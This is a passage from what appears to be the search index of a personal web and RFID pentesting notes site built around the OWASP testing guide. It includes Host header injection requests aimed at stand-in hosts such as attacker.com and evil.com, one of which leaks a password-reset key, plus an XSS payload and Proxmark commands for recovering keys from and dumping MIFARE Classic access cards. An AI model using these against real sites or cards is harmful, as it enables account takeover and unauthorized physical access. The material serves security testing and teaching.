https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html</p>","tags":["web pentesting","WSTG-INPV-17"]},{"location":"OWASP/WSTG-INPV-17/#supply-an-arbitrary-host-header","title":"Supply an arbitrary Host header","text":"<p>Some intercepting proxies derive the target IP address from the Host header directly, which makes this kind of testing all but impossible; any changes you made to the header would just cause the request to be sent to a completely different IP address. However, Burp Suite accurately maintains the separation between the Host header and the target IP address. </p> <p>In Burpsuite, set the target to www.example.com. Then, send your request with modified Host header:</p> <pre><code>GET / HTTP/1.1\nHost: www.attacker.com\n</code></pre> <p>The front-end server or load balancer that received your request may simply not know where to forward it, resulting in an \"Invalid Host header\" error of some kind. This is especially likely if your target is accessed via a CDN.</p>","tags":["web pentesting","WSTG-INPV-17"]},{"location":"OWASP/WSTG-INPV-17/#inject-host-override-headers","title":"Inject host override headers","text":"","tags":["web pentesting","WSTG-INPV-17"]},{"location":"OWASP/WSTG-INPV-17/#x-forwarded-host-header-bypass","title":"X-Forwarded Host Header Bypass","text":"<pre><code>GET / HTTP/1.1\nHost: www.example.com\nX-Forwarded-Host: www.attacker.com\n</code></pre> <p>Potentially producing client-side output such as:</p> <pre><code>&lt;link src=\"http://www.attacker.com/link\" /&gt;\n</code></pre>","tags":["web pentesting","WSTG-INPV-17"]},{"location":"OWASP/WSTG-INPV-17/#more-headers-bypassing","title":"More headers bypassing","text":"<p>Although\u00a0<code>X-Forwarded-Host</code>\u00a0is the de facto standard for this behavior, you may come across other headers that serve a similar purpose, including:</p> <ul> <li><code>X-Host</code></li> <li><code>X-Forwarded-Server</code></li> <li><code>X-HTTP-Host-Override</code></li> <li><code>Forwarded</code></li> </ul> <p>In Burp Suite, you can use thec's \"Guess headers\" function to automatically probe for supported headers using its extensive built-in wordlist.</p>","tags":["web pentesting","WSTG-INPV-17"]},{"location":"OWASP/WSTG-INPV-17/#injecting-multiple-host-headers","title":"Injecting multiple Host headers","text":"<pre><code>GET / HTTP/1.1\nHost:\u00a0www.example.com\nHost: www.attacker.com\n</code></pre>","tags":["web pentesting","WSTG-INPV-17"]},{"location":"OWASP/WSTG-INPV-17/#http_host-vs-server_name-routing","title":"HTTP_HOST vs. SERVER_NAME Routing","text":"<p>By supplying an absolute URL.</p> <pre><code>POST https://example.com/passwordreset HTTP/1.1\nHost: www.evil.com\n</code></pre>","tags":["web pentesting","WSTG-INPV-17"]},{"location":"OWASP/WSTG-INPV-17/#port-based-attack","title":"Port-based attack","text":"<p>Webservers allow a port to be specified in the Host header, but ignore it for the purpose of deciding which virtual host to pass the request to. This is simple to exploit using the ever-useful http://username:password@domain.com syntax:</p> <pre><code>POST /user/passwrordeset HTTP/1.1\nHost: example.com:@attacker.net\n</code></pre> <p>This may result in a suspicious password reset link. By clicking it, the victim's browser will  send the key to attacker.net before creating the suspicious URL popup.</p>","tags":["web pentesting","WSTG-INPV-17"]},{"location":"OWASP/WSTG-INPV-17/#persistent-xss-via-host-header-injection","title":"Persistent XSS via Host header injection","text":"<pre><code>GET /index.html HTTP/1.1\nHost: cow\\\"onerror='alert(1)'rel='stylesheet'\" http://example.com/ | fgrep cow\\\n</code></pre> <p>The response should show a poisoned <code>&lt;link&gt;</code> element:</p> <pre><code>&lt;link href=\"http://cow\"onerror='alert(1)'rel='stylesheet'/\" rel=\"canonical\"/&gt;\n</code></pre>","tags":["web pentesting","WSTG-INPV-17"]},{"location":"OWASP/WSTG-INPV-17/#add-line-wrapping","title":"Add line wrapping","text":"<p>The website may block requests with multiple Host headers, but you may be able to bypass this validation by indenting one of them like this. Some servers will interpret the indented header as a wrapped line and, therefore, treat it as part of the preceding header's value. Other servers will ignore the indented header altogether.</p> <pre><code>GET /example HTTP/1.1 \n    Host: attacker.com \nHost: example.com\n</code></pre>","tags":["web pentesting","WSTG-INPV-17"]},{"location":"OWASP/WSTG-INPV-17/#exploitation","title":"Exploitation","text":"<p>https://portswigger.net/web-security/host-header/exploiting</p>","tags":["web pentesting","WSTG-INPV-17"]},{"location":"OWASP/WSTG-INPV-18/","title":"Testing for Server-side Template Injection","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.18. Testing for Server-side Template Injection</p> ID Link to Hackinglife Link to OWASP Description 7.18 WSTG-INPV-18 Testing for Server-side Template Injection - Detect template injection vulnerability points. - Identify the templating engine.  - Build the exploit. <p>Server-side Template Injection in HackingLife</p> <p>Web applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. Server-side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. Any features that support advanced user-supplied markup may be vulnerable to SSTI.</p>","tags":["web pentesting","WSTG-INPV-18"]},{"location":"OWASP/WSTG-INPV-18/#see-my-notes","title":"See my notes","text":"<ul> <li>Server Side Template Injections: What is it. How this attack works. Attack classification. Types of databases. Payloads. Dictionaries.</li> </ul>","tags":["web pentesting","WSTG-INPV-18"]},{"location":"OWASP/WSTG-INPV-19/","title":"Testing for Server-Side Request Forgery","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.19. Testing for Server-Side Request Forgery | ID   | Link to Hackinglife             | Link to OWASP                                                                                                                                                                                                        | Description                                                                                                                    | | :--- | :------------------------------ | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------- | | 7.19 | WSTG-INPV-19 | Testing for Server-Side Request Forgery | - Identify SSRF injection points.  - Test if the injection points are exploitable.  - Asses the severity of the vulnerability. |</p>","tags":["web pentesting","WSTG-INPV-19"]},{"location":"OWASP/WSTG-INPV-19/#see-my-notes","title":"See my notes","text":"<ul> <li>Server Side Request Forgery SSRF: What is it. Payloads. Techniques. Dictionaries. Tools.</li> </ul>","tags":["web pentesting","WSTG-INPV-19"]},{"location":"OWASP/WSTG-INPV-20/","title":"Testing for Mass Assignment","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 7. Data Validation Testing &gt; 7.20. Testing for Mass Assignment</p> ID Link to Hackinglife Link to OWASP Description 7.20 WSTG-INPV-20 Testing for Mass Assignment - Identify requests that modify objects  - Assess if it is possible to modify fields never intended to be modified from outside","tags":["web pentesting","WSTG-INPV-20"]},{"location":"OWASP/WSTG-SESS-01/","title":"Testing for Session Management Schema","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 6. Session Management Testing &gt; 6.1. Testing for Session Management Schema</p> ID Link to Hackinglife Link to OWASP Description 6.1 WSTG-SESS-01 Testing for Session Management Schema - Gather session tokens, for the same user and for different users where possible.  - Analyze and ensure that enough randomness exists to stop session forging attacks.  - Modify cookies that are not signed and contain information that can be manipulated. <p>Session management in web applications refers to the process of securely handling and maintaining user sessions. A session is a period of interaction between a user and a web application, typically beginning when a user logs in and ending when they log out or their session expires due to inactivity. During a session, the application needs to recognize and track the user, store their data, and manage their access to different parts of the application. </p>","tags":["web pentesting","WSTG-SESS-01"]},{"location":"OWASP/WSTG-SESS-01/#components","title":"Components","text":"<ul> <li>Session Identifier: A unique token (often a session ID) is assigned to each user's session. This token is used to associate subsequent requests from the user with their session data.</li> <li>Session Data: Information related to the user's session, such as authentication status, user preferences, and temporary data, is stored on the server.</li> <li>Session Cookies: Session cookies are small pieces of data stored on the user's browser that contain the session ID. They are used to maintain state between the client and server.</li> </ul>","tags":["web pentesting","WSTG-SESS-01"]},{"location":"OWASP/WSTG-SESS-01/#what-is-session-used-for","title":"What is session used for","text":"<ul> <li>User Authentication: Session management is critical for user authentication. After a user logs in, the session management system keeps track of their authenticated state, allowing them to access protected resources without repeatedly entering credentials.</li> <li>User State: Web applications often need to maintain state information about a user's activities. For example, in an e-commerce site, the session management system keeps track of the items in a user's shopping cart.</li> <li>Security: If proper session management is not implemented correctly, it can lead to vulnerabilities such as session fixation, session hijacking, and unauthorized access.</li> </ul>","tags":["web pentesting","WSTG-SESS-01"]},{"location":"OWASP/WSTG-SESS-01/#session-management-testing","title":"Session Management Testing","text":"<p>Some typical vulnerabilities related to session management are:</p> <ul> <li>Session Fixation Testing: Test for session fixation vulnerabilities by attempting to set a known session ID (controlled by the tester) and then login with another account. Verify if the application accepts the predefined session ID and allows the attacker access to the target account.</li> <li>Session Hijacking Testing: Test for session hijacking vulnerabilities by trying to capture and reuse another user's session ID. Tools like Wireshark or Burp Suite can help intercept and analyze network traffic for session data.</li> <li>Session ID Brute-Force: Attempt to brute force session IDs to assess their complexity and the application's resistance to such attacks.</li> </ul>","tags":["web pentesting","WSTG-SESS-01"]},{"location":"OWASP/WSTG-SESS-02/","title":"Testing for Cookies Attributes","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 6. Session Management Testing &gt; 6.2. Testing for Cookies Attributes</p> ID Link to Hackinglife Link to OWASP Description 6.2 WSTG-SESS-02 Testing for Cookies Attributes - Ensure that the proper security configuration is set for cookies (HTTPOnly and Secure flag, Samesite=Strict)","tags":["web pentesting","WSTG-SESS-02"]},{"location":"OWASP/WSTG-SESS-03/","title":"Testing for Session Fixation","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 6. Session Management Testing &gt; 6.3. Testing for Session Fixation</p> ID Link to Hackinglife Link to OWASP Description 6.3 WSTG-SESS-03 Testing for Session Fixation - Analyze the authentication mechanism and its flow.  - Force cookies and assess the impact.  - Check whether the application renew the cookie after a successfully user authentication. <p>Session fixation is a web application security attack where an attacker sets or fixes a user's session identifier (session token) to a known value of the attacker's choice. Subsequently, the attacker tricks the victim into using this fixed session identifier to log in, thereby granting the attacker unauthorized access to the victim's session.</p> <p>The attacker obtains a session token issued by the target web application. This can be done in several ways, such as:</p> <ul> <li>Predicting or guessing the session token: Some web applications generate session tokens that are easy to predict or lack sufficient randomness.</li> <li>Intercepting the session token: If the application doesn't use secure channels (e.g., HTTPS) to transmit session tokens, an attacker may intercept them as they travel over an insecure network, such as an open Wi-Fi hotspot.</li> </ul> <p>With a session token in hand, the attacker sets or fixes the victim's session token to a known value that the attacker controls. This value could be one generated by the  attacker or an existing valid session token.</p> <p>The attacker lures the victim into using the fixed session token to log in to the web application. This can be accomplished through various means:</p> <ul> <li>Sending the victim a link that includes the fixed session token.</li> <li>Manipulating the victim into clicking on a specially crafted URL.</li> <li>Social engineering tactics to convince the victim to log in under specific circumstances.</li> </ul> <p>Once the victim logs in with the fixed session token, the attacker can now hijack the victim's session. The web application recognizes the attacker as the legitimate user since the session token matches what is expected.</p>","tags":["web pentesting","WSTG-SESS-03"]},{"location":"OWASP/WSTG-SESS-03/#mitigation","title":"Mitigation","text":"<ul> <li>Implementing a session token renewal after a user successfully authenticates.</li> <li>The application should always first invalidate the existing session ID before authenticating a user, and if the authentication is successful, provide another session ID.</li> <li>Prevent \"forced cookies\" with full HSTS adoption.</li> </ul>","tags":["web pentesting","WSTG-SESS-03"]},{"location":"OWASP/WSTG-SESS-04/","title":"Testing for Exposed Session Variables","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 6. Session Management Testing &gt; 6.4. Testing for Exposed Session Variables</p> ID Link to Hackinglife Link to OWASP Description 6.4 WSTG-SESS-04 Testing for Exposed Session Variables - Ensure that proper encryption is implemented (Encryption &amp; Reuse of session Tokens vulnerabilities).  - Review the caching configuration.  - Assess the channel and methods' security (Send sessionID with GET method ?)","tags":["web pentesting","WSTG-SESS-04"]},{"location":"OWASP/WSTG-SESS-05/","title":"Testing for Cross Site Request Forgery","text":"OWASP <p>OWASP Web Security Testing Guide 4.2 &gt; 6. Session Management Testing &gt; 6.5. Testing for Cross Site Request Forgery</p> ID Link to Hackinglife Link to OWASP Description 6.5 WSTG-SESS-05 Testing for Cross Site Request Forgery - Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user.  - Conduct URL analysis, Direct access to functions without any token. <p>Cross Site Request Forgery (CSRF) is a type of web security vulnerability that occurs when an attacker tricks a user into performing actions on a web application without their knowledge or consent. A successful CSRF exploit can compromise end user data and operation when it targets a normal user. If the targeted end user is the administrator account, a CSRF attack can compromise the entire web application.</p>","tags":["web pentesting","WSTG-SESS-05"]},{"location":"OWASP/WSTG-SESS-05/#see-my-notes","title":"See my notes","text":"<ul> <li>CSRF attack - Cross Site Request Forgery</li> </ul>","tags":["web pentesting","WSTG-SESS-05"]},{"location":"OWASP/WSTG-SESS-06/","title":"Testing for Logout Functionality","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 6. Session Management Testing &gt; 6.6. Testing for Logout Functionality</p> ID Link to Hackinglife Link to OWASP Description 6.6 WSTG-SESS-06 Testing for Logout Functionality - Assess the logout UI.  - Analyze the session timeout and if the session is properly killed after logout.","tags":["web pentesting","WSTG-SESS-06"]},{"location":"OWASP/WSTG-SESS-07/","title":"Testing Session Timeout","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 6. Session Management Testing &gt; 6.7. Testing Session Timeout</p> ID Link to Hackinglife Link to OWASP Description 6.7 WSTG-SESS-07 Testing Session Timeout - Validate that a hard session timeout exists, after the timeout has passed, all session tokens should be destroyed or be unusable.","tags":["web pentesting","WSTG-SESS-07"]},{"location":"OWASP/WSTG-SESS-08/","title":"Testing for Session Puzzling","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 6. Session Management Testing &gt; 6.8. Testing for Session Puzzling</p> ID Link to Hackinglife Link to OWASP Description 6.8 WSTG-SESS-08 Testing for Session Puzzling - Identify all session variables.  - Break the logical flow of session generation.  - Check whether the application uses the same session variable for more than one purpose","tags":["web pentesting","WSTG-SESS-08"]},{"location":"OWASP/WSTG-SESS-09/","title":"Testing for Session Hijacking","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 6. Session Management Testing &gt; 6.9. Testing for Session Hijacking</p> ID Link to Hackinglife Link to OWASP Description 6.9 WSTG-SESS-09 Testing for Session Hijacking - Identify vulnerable session cookies.  - Hijack vulnerable cookies and assess the risk level. <p>An attacker who gets access to user session cookies can impersonate them by presenting such cookies. This attack is known as session hijacking. </p>","tags":["web pentesting","WSTG-SESS-09"]},{"location":"OWASP/WSTG-SESS-09/#testing","title":"Testing","text":"<p>The testing strategy is targeted at network attackers, hence it only needs to be applied to sites without full HSTS adoption (sites with full HSTS adoption are secure, since their cookies are not communicated over HTTP).  </p> <p>We assume to have two testing accounts on the website under test, one to act as the victim and one to act as the attacker. We Web Security Testing Guide v4.2 214 simulate a scenario where the attacker steals all the cookies which are not protected against disclosure over HTTP, and presents them to the website to access the victim\u2019s account. If these cookies are enough to act on the victim\u2019s behalf, session hijacking is possible.</p> <p>Steps for executing this test:  1. Login to the website as the victim and reach any page offering a secure function requiring authentication. 2. Delete from the cookie jar all the cookies which satisfy any of the following conditions. in case there is no HSTS adoption: the Secure attribute is set. in case there is partial HSTS adoption: the Secure attribute is set or the Domain attribute is not set.  3. Save a snapshot of the cookie jar.  4. Trigger the secure function identified at step 1.  5. Observe whether the operation at step 4 has been performed successfully. If so, the attack was successful.  6. Clear the cookie jar, login as the attacker and reach the page at step 1.  7. Write in the cookie jar, one by one, the cookies saved at step 3.  8. Trigger again the secure function identified at step 1.  9. Clear the cookie jar and login again as the victim.  10. Observe whether the operation at step 8 has been performed successfully in the victim\u2019s account. If so, the attack was successful; otherwise, the site is secure against session hijacking.</p>","tags":["web pentesting","WSTG-SESS-09"]},{"location":"OWASP/WSTG-SESS-09/#mitigation","title":"Mitigation","text":"<ul> <li>Full HSTS adoption. </li> </ul>","tags":["web pentesting","WSTG-SESS-09"]},{"location":"OWASP/WSTG-SESS-10/","title":"Testing JSON Web Tokens","text":"<p>OWASP Web Security Testing Guide 4.2 &gt; 6. Session Management Testing &gt; 6.10. Testing JSON Web Tokens</p> ID Link to Hackinglife Link to OWASP Description 6.10 WSTG-SESS-10 Testing JSON Web Tokens - Determine whether the JWTs expose sensitive information.  - Determine whether the JWTs can be tampered with or modified.","tags":["web pentesting","WSTG-SESS-10"]},{"location":"RFID/mifare-classic/","title":"Mifare Classic","text":"","tags":["pentesting","NFC","RFID"]},{"location":"RFID/mifare-classic/#mifare-classic_1","title":"Mifare classic","text":"<p>The MiFare CanaNFC-based NFC based chip following the\u00a0ISO 14443A\u00a049\u00a0standard. The memory of this chip (assuming we are talking about the Classic 1K) is divided into 16 sectors of 64 bytes each. Like most, if not all, NFC cards it also contains UID and other data. Each sector can contain 2 keys as well as access condition information. All of these sectors can be encrypted with the Crypto1 algorithm to protect the data from being copied. Each key in each sector can be used to open a door (or anything else) in a sequence that goes something like this:</p> <ol> <li>Reader detects NFC card and sends out information to unlock at least 1 sector on the MiFare Classic chip</li> <li>Assuming the MiFare classic is programmed for this door, it sends back the key and access conditions</li> <li>The reader validates the key and access conditions it receives and checks if the UID of the key is valid or within a specified range</li> <li>If everything is in order, the reader opens the door</li> </ol>","tags":["pentesting","NFC","RFID"]},{"location":"RFID/mifare-classic/#mifare-classic-cards","title":"Mifare Classic Cards","text":"<ul> <li>Mifare Classic 1K</li> <li>Mifare Classic 4K</li> <li>Mifare Classic EV1</li> </ul> <p>In a Mifare classic card there are sectors, and each sector contains a number of blocks. Each sector has a sector trailer, which is a block through which you can access data. That means that access conditions are stored in the sector trailer (the key A, the key B and the access bits.)</p> <p>Each Mifare Tag has a 4Bytes UID which is unique and not changeable. Some Mifare cards have a 7 Byte UID.</p> <p>Transport configuration: At chip delivery, all keys are set to 0xFF FF FF FF FF FF (6 times FFh) and the bytes 6, 7 and 8 are set to 0xFF0780 (See Transport Configuration.) Additionally byte-9 is used for general purpose 1 byte user data. Factory default value is 0x69. Therefore, at chip delivery sector trailer would be:</p> 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF <p>Or: </p> Key A Access bits Key B FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF <p>Transport configuration is the name for factory default keys and configuration:  - KeyA: 0x FF FF FF FF FF FF (Default Key - Cannot be readable)  - KeyB: 0x FF FF FF FF FF FF (Default Data) KeyB is used as data in transport configuration because it is readable. It cannot be used as authentication key.  - Access Bits: 0xFF0780 Access Bits: 0xFF0780 meaning:      - KeyA never be read, but can write(change) itself.      - KeyA can read/write Access Bits and KeyB.      - Notice that the KeyB is read-able by KeyA. Thus, KeyB cannot be used as an authentication key. It can be used for general purpose user data.      - KeyA is allowed to read/write/increment/decrement for the data blocks</p>","tags":["pentesting","NFC","RFID"]},{"location":"RFID/mifare-classic/#mifare-classics-1k","title":"Mifare Classics 1K","text":"<p>Memory Organization:</p> <ul> <li>1024 Bytes</li> <li>Sectors and Blocks: </li> <li>16 Sectors (0-15).</li> <li>4 block in each Sector </li> <li>16 Bytes in each Block</li> <li>2 Keys (A/B) in each Sector </li> <li>Sector Trailer </li> <li>Authentication is required</li> </ul> <p>Access bits and conditions: Attention: With each memory access the internal logic verifies the format of the access conditions. If it detects a format violation the whole sector is irreversibly blocked.</p> <p></p> <p>On chip delivery the access conditions for the sector trailers and KeyA are predefined as Transport Configuration. Since KeyB may be read in the transport configuration, it cannot be used as authentication key and new cards must be authenticated with KeyA. Since the access bits themselves can also be blocked, special care has to be taken during the personalization of cards.</p> <p>Access conditions of sector trailer:</p> <p></p> <p>Access Conditions of Data Block</p> <p></p> <p>Following example analysis the Transport Configuration Access Bits (0xFF0780):</p> <ul> <li>Byte6 = 0xFF </li> <li>Byte7 = 0x07 </li> <li>Byte8 = 0x80</li> </ul>","tags":["pentesting","NFC","RFID"]},{"location":"RFID/mifare-classic/#mifare-classic-4k","title":"Mifare Classic 4K","text":"<p>Structure Memory Structure:</p> <ul> <li>4096 Bytes</li> <li>40 Sectors (0-39) </li> <li>32 Sectors (0 \u2013 31 ) are of 4 Blocks </li> <li>8 Sectors are of 16 Blocks </li> <li>Each Sector has Sector Trailer Block </li> <li>Authentication is required</li> </ul>","tags":["pentesting","NFC","RFID"]},{"location":"RFID/mifare-classic/#cloning-a-mifare-classic","title":"Cloning a MIFARE classic","text":"<p>Proxmark Cheat sheet</p> <p>Make sure that it's a MIFARE classic 1K card:</p> <pre><code>hf search\n</code></pre> <p>Lats line should return:</p> <pre><code>Valid ISO14443A Tag Found - Quitting Search\n</code></pre> <p>In this case it\u2019s a Mifare 1k card. Copy  the UID of the card, which we\u2019ll need later. From there we can find keys in use by checking against a list of default keys (hopefully one of these has been used):</p> <pre><code>hf mf chk --1k -f mfc_default_keys\n</code></pre> <p>Results: </p> <pre><code>Found valid key:[ffffffffffff]  \n</code></pre> <p>This shows a key of ffffffffffff, which we can plug into the next command, which dumps keys to file:</p> <pre><code>hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF --dump\n</code></pre> <p>This dumps keys from the card into the file dumpkeys.bin. The output should be something like this:</p> <pre><code>[+] Testing known keys. Sector count 16\n[+] Fast check found all keys\n\n[+] found keys:\n\n[+] -----+-----+--------------+---+--------------+----\n[+]  Sec | Blk | key A        |res| key B        |res\n[+] -----+-----+--------------+---+--------------+----\n[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  001 | 007 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  002 | 011 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  003 | 015 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  004 | 019 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  005 | 023 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  006 | 027 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  007 | 031 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  008 | 035 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  009 | 039 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  010 | 043 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  011 | 047 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  012 | 051 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  013 | 055 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  014 | 059 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+]  015 | 063 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1\n[+] -----+-----+--------------+---+--------------+----\n[+] ( 0:Failed / 1:Success )\n\n[+] Generating binary key file\n[+] Found keys have been dumped to `/home/ME/hf-mf-&lt;UID&gt;-key.bin`\n[=] --[ FFFFFFFFFFFF ]-- has been inserted for unknown keys where res is 0\n</code></pre> <p>Another way is to do an autopwn:</p> <pre><code>hf mf autopwn\n</code></pre> <p>Now to dump the contents of the card:</p> <pre><code>hf mf dump --1k\n</code></pre> <p>This dumps data from the card into dumpdata.bin. The output should be something like this:</p> <pre><code>Using... hf-mf-&lt;UID&gt;-key.bin\n[+] Loaded binary key file `/home/ME/hf-mf-&lt;UID&gt;-key.bin`\n[=] Reading sector access bits...\n[=] .................\n[+] Finished reading sector access bits\n[=] Dumping all blocks from card...\n \ud83d\udd53 Sector...  9 block... 3 ( ok )[#] Can't select card\n[#] Can't select card\n \ud83d\udd51 Sector... 15 block... 1 ( ok )[#] Can't select card\n \ud83d\udd53 Sector... 15 block... 3 ( ok )\n[+] Succeeded in dumping all blocks\n\n[+] time: 9 seconds\n\n\n[=] -----+-----+-------------------------------------------------+-----------------\n[=]  sec | blk | data                                            | ascii\n[=] -----+-----+-------------------------------------------------+-----------------\n[=]    0 |   0 | FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF | .B........]..6..\n[=]      |   1 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |   2 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |   3 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]    1 |   4 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |   5 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |   6 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |   7 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]    2 |   8 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |   9 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  10 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  11 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]    3 |  12 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  13 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  14 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  15 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]    4 |  16 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  17 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  18 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  19 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]    5 |  20 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  21 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  22 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  23 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]    6 |  24 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  25 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  26 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  27 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]    7 |  28 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  29 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  30 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  31 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]    8 |  32 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  33 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  34 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  35 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]    9 |  36 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  37 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  38 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  39 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]   10 |  40 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  41 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  42 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  43 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]   11 |  44 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  45 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  46 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  47 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]   12 |  48 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  49 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  50 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  51 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]   13 |  52 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  53 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  54 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  55 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]   14 |  56 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  57 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  58 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  59 | FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF | .........i......\n[=]   15 |  60 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  61 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  62 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ \n[=]      |  63 | FF FF FF FF FF FF FF 07 80 69 FF FF FF 